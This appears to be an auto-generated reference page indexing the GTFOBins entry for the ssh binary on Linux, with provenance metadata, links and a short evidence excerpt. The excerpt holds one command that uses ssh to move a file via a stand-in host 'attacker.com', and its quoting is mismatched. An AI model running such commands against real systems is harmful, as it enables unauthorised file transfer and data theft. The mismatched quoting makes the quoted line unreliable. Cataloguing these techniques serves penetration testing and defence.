---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# ssh

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `ssh` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ssh` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for ssh covering download, file-read, shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/ssh.md)
- Source verification: [source record](../../sources/gtfobins/ssh.md)

## Aliases

- `ssh`

## Source Verification

[source record](../../sources/gtfobins/ssh.md)

## Evidence Excerpt

```text
_body: ''
_name: ssh
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ssh
functions:
download:
- code: ssh user@attacker.com 'cat /path/to/input-file"
contexts:
sudo: null
```
